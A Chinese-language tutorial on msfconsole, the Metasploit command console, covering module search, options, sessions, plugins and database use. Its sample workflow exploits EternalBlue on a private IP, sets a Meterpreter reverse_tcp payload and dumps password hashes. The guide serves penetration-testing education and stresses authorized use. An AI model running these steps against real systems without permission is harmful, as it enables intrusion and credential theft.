


'Metasploit Framework（简称 **MSF**）是一个功能强大的开源渗透测试平台，广泛用于安全评估、漏洞研究和开发。它提供了丰富的工具和模块，用于发现、开发和利用漏洞。以下是 **msfconsole** 的详细用法大全，涵盖了从基本操作到高级功能的各个方面。

---

## 1. 启动 msfconsole

首先，确保你已经安装了 Metasploit Framework。然后，通过以下命令启动 msfconsole：

```bash
msfconsole
```

启动后，你会看到 Metasploit 的欢迎界面和提示符 `msf >`，表示你已经成功进入 msfconsole 环境。

---

## 2. 基本命令

### 2.1 帮助系统

- **显示帮助菜单**

  ```bash
  msf > help
  ```

  或者使用简写：

  ```bash
  msf > ?
  ```

- **获取特定命令的帮助**

  ```bash
  msf > help <command>
  ```

  例如：

  ```bash
  msf > help search
  ```

### 2.2 搜索模块

- **搜索漏洞利用模块**

  ```bash
  msf > search <keyword>
  ```

  例如，搜索与 Windows 相关的漏洞：

  ```bash
  msf > search platform:windows type:exploit
  ```

- **搜索辅助模块**

  ```bash
  msf > search type:auxiliary
  ```

### 2.3 选择模块

- **使用 `use` 命令选择模块**

  ```bash
  msf > use <module_path>
  ```

  例如，选择一个针对 Windows 的漏洞利用模块：

  ```bash
  msf > use exploit/windows/smb/ms17_010_eternalblue
  ```

### 2.4 显示模块信息

- **显示当前模块的信息**

  ```bash
  msf exploit(ms17_010_eternalblue) > info
  ```

- **显示特定模块的信息**

  ```bash
  msf > info <module_path>
  ```

  例如：

  ```bash
  msf > info exploit/windows/smb/ms17_010_eternalblue
  ```

### 2.5 设置模块参数

- **列出所有可配置的参数**

  ```bash
  msf exploit(ms17_010_eternalblue) > show options
  ```

- **设置参数值**

  ```bash
  msf exploit(ms17_010_eternalblue) > set <parameter> <value>
  ```

  例如，设置目标 IP：

  ```bash
  msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
  ```

- **设置全局参数**

  ```bash
  msf > setg <parameter> <value>
  ```

  例如，设置全局目标 IP：

  ```bash
  msf > setg RHOSTS 192.168.1.100
  ```

- **取消设置参数**

  ```bash
  msf exploit(ms17_010_eternalblue) > unset <parameter>
  ```

  例如，取消设置目标 IP：

  ```bash
  msf exploit(ms17_010_eternalblue) > unset RHOSTS
  ```

### 2.6 运行模块

- **执行漏洞利用或辅助模块**

  ```bash
  msf exploit(ms17_010_eternalblue) > exploit
  ```

  或者使用 `run` 命令：

  ```bash
  msf auxiliary(smb_version) > run
  ```

### 2.7 后渗透（Post-Exploitation）

- **进入会话**

  ```bash
  msf exploit(ms17_010_eternalblue) > sessions -i <session_id>
  ```

  例如，进入会话 1：

  ```bash
  msf exploit(ms17_010_eternalblue) > sessions -i 1
  ```

- **列出所有活跃会话**

  ```bash
  msf > sessions -l
  ```

- **终止会话**

  ```bash
  msf > sessions -k <session_id>
  ```

  或者终止所有会话：

  ```bash
  msf > sessions -K
  ```

---

## 3. 常用模块分类

### 3.1 漏洞利用模块（Exploits）

- **列出所有漏洞利用模块**

  ```bash
  msf > show exploits
  ```

- **选择漏洞利用模块**

  ```bash
  msf > use exploit/<path>
  ```

  例如：

  ```bash
  msf > use exploit/linux/http/apache_mod_cgi_bash_env_exec
  ```

### 3.2 辅助模块（Auxiliaries）

- **列出所有辅助模块**

  ```bash
  msf > show auxiliaries
  ```

- **选择辅助模块**

  ```bash
  msf > use auxiliary/<path>
  ```

  例如：

  ```bash
  msf > use auxiliary/scanner/ssh/ssh_version
  ```

### 3.3 有效载荷模块（Payloads）

- **列出所有有效载荷模块**

  ```bash
  msf > show payloads
  ```

- **设置有效载荷**

  ```bash
  msf exploit(ms17_010_eternalblue) > set payload windows/meterpreter/reverse_tcp
  ```

### 3.4 后渗透模块（Post-Exploitation）

- **列出所有后渗透模块**

  ```bash
  msf > show post
  ```

- **使用后渗透模块**

  ```bash
  msf > use post/<path>
  ```

  例如：

  ```bash
  msf > use post/windows/gather/hashdump
  ```

---

## 4. 高级功能

### 4.1 会话管理

- **列出所有会话**

  ```bash
  msf > sessions -l
  ```

- **与特定会话交互**

  ```bash
  msf > sessions -i <session_id>
  ```

  例如：

  ```bash
  msf > sessions -i 2
  ```

- **终止会话**

  ```bash
  msf > sessions -k <session_id>
  ```

  或者终止所有会话：

  ```bash
  msf > sessions -K
  ```

### 4.2 资源文件

- **运行资源文件**

  ```bash
  msf > resource <file_path>
  ```

  例如：

  ```bash
  msf > resource /path/to/resource.rc
  ```

- **创建资源文件**

  你可以编写一个包含一系列 Metasploit 命令的脚本文件（通常以 `.rc` 为后缀），然后使用 `resource` 命令执行它。

### 4.3 插件管理

- **列出所有可用插件**

  ```bash
  msf > load -l
  ```

- **加载插件**

  ```bash
  msf > load <plugin_name>
  ```

  例如：

  ```bash
  msf > load openvas
  ```

- **卸载插件**

  ```bash
  msf > unload <plugin_name>
  ```

### 4.4 数据库集成

Metasploit 可以与 PostgreSQL 数据库集成，以存储扫描结果、漏洞信息等。

- **初始化数据库**

  ```bash
  msf > db_init
  ```

- **连接到数据库**

  ```bash
  msf > db_connect <user>:<password>@<host>:<port>/<database>
  ```

  例如：

  ```bash
  msf > db_connect postgres:password@localhost:5432/msf
  ```

- **断开数据库连接**

  ```bash
  msf > db_disconnect
  ```

- **导入数据**

  ```bash
  msf > db_import <file_path>
  ```

  例如：

  ```bash
  msf > db_import nmap.xml
  ```

- **显示数据库中的主机信息**

  ```bash
  msf > hosts
  ```

- **显示数据库中的服务信息**

  ```bash
  msf > services
  ```

### 4.5 日志记录

- **查看日志**

  ```bash
  msf > logs
  ```

- **设置日志级别**

  ```bash
  msf > setg Logging:Level <level>
  ```

  例如：

  ```bash
  msf > setg Logging:Level 3
  ```

---

## 5. 常用命令汇总

- **列出所有模块**

  ```bash
  msf > show all
  ```

- **列出所有主机**

  ```bash
  msf > hosts
  ```

- **列出所有服务**

  ```bash
  msf > services
  ```

- **扫描主机**

  ```bash
  msf > db_nmap <nmap_options>
  ```

  例如：

  ```bash
  msf > db_nmap -A 192.168.1.0/24
  ```

- **使用 Meterpreter 会话**

  ```bash
  msf > sessions -i <session_id>
  ```

- **运行命令**

  ```bash
  msf > run <command>
  ```

  例如：

  ```bash
  msf > run autoroute -s 10.0.0.0/8
  ```

- **设置路由**

  ```bash
  msf > route add <subnet> <netmask> <session_id>
  ```

  例如：

  ```bash
  msf > route add 10.0.0.0 255.0.0.0 1
  ```

---

## 6. 示例流程

以下是一个典型的 Metasploit 使用流程示例：

1. **启动 msfconsole**

   ```bash
   msfconsole
   ```

2. **搜索相关漏洞**

   ```bash
   msf > search type:exploit platform:windows name:smb
   ```

3. **选择漏洞利用模块**

   ```bash
   msf > use exploit/windows/smb/ms17_010_eternalblue
   ```

4. **显示模块信息**

   ```bash
   msf exploit(ms17_010_eternalblue) > info
   ```

5. **设置目标参数**

   ```bash
   msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
   msf exploit(ms17_010_eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
   ```

6. **设置有效载荷参数**

   ```bash
   msf exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
   msf exploit(ms17_010_eternalblue) > set LPORT 4444
   ```

7. **运行漏洞利用**

   ```bash
   msf exploit(ms17_010_eternalblue) > exploit
   ```

8. **进入会话**

   ```bash
   msf exploit(ms17_010_eternalblue) > sessions -i 1
   ```

9. **执行后渗透命令**

   ```bash
   meterpreter > sysinfo
   meterpreter > hashdump
   ```

10. **退出会话**

    ```bash
    meterpreter > exit
    ```

11. **退出 msfconsole**

    ```bash
    msf > exit
    ```

---

## 7. 注意事项

- **权限管理**：确保你有权对目标系统进行渗透测试，并遵守相关法律法规。
- **道德使用**：Metasploit 应仅用于合法的安全评估和渗透测试，不得用于非法活动。
- **更新框架**：定期更新 Metasploit Framework 以获取最新的漏洞利用模块和安全补丁。
